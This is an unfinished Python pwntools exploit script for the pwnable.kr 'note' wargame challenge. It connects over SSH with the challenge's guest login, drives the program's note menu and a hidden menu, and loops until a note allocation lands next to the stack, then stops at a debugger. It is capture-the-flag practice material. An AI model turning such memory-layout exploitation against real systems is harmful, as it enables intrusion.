from pwn import *
import re

#context.log_level = 'error'
host = 'pwnable.kr'
host = '0'

s = ssh(host='pwnable.kr', user='note', password='guest', port=2222)
#conn = s.remote(host, 9019)
conn = s.process('./note', aslr=False)

stack_addr = 0xfffdd000

def create_note():
	conn.sendline('1')
	line = conn.readuntil('- Select Menu -')
	if 'memory sults are fool' in line:
		print 'Error: ' + line
		return
	rta = re.search(r'note created\. no (\d+)\s*\[(\w+)\]', line)
	num = rta.group(1)
	addr = rta.group(2)
	return num, addr

def write_note(nro, text):
	conn.sendline('2')
	conn.readuntil('note no?\n')
	conn.sendline(str(nro))
	line = conn.recvline()
	if 'empty' in line or 'index out of range' in line:
		print 'Error: ' + line
		return
	conn.send(text + '\n')
	conn.readuntil('5. exit\n')

def read_note(nro):
	conn.sendline('3')
	conn.sendline(str(nro))
	line = conn.recvline()
	if 'empty' in line or 'index out of range' in line:
		print 'Error: ' + line
		return
	text = conn.readuntil('- Select Menu -')
	conn.readuntil('5. exit\n')
	return text.rstrip('\n- Select Menu -')

def delete_note(nro):
	conn.sendline('4')
	conn.readuntil('note no?\n')
	conn.sendline(str(nro))
	line = conn.recvline()
	if 'already empty slut!' in line or 'index out of range' in line:
		print 'Error: ' + line
		return

def exit():
	conn.sendline('5')

def secret_menu(text):
	conn.sendline('201527')
	conn.readuntil('pwn this\n')
	conn.send(text)

def test():
	num, addr = create_note()
	write_note(num, 'test!')
	a = read_note(num)
	print a
	delete_note(num)
	return

def get_note_ontop_of_stack():
	iteraciones = 1
	while True:
		iteraciones += 1
		num, addr = create_note()
		addr = int(addr, 16)
		if addr > 0xf7ffe000 and addr < stack_addr:
			return num, addr, iteraciones
		else:
			iteraciones += 1
			delete_note(num)

def main():
	conn.readuntil('5. exit\n')
	num, addr, iteraciones = get_note_ontop_of_stack()
	print 'nota encima del stack\naddr: {}'.format(hex(addr))
	print str(iteraciones)
	distancia = stack_addr - addr
	gdb.attach(conn)
	input()
	input()

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		pass
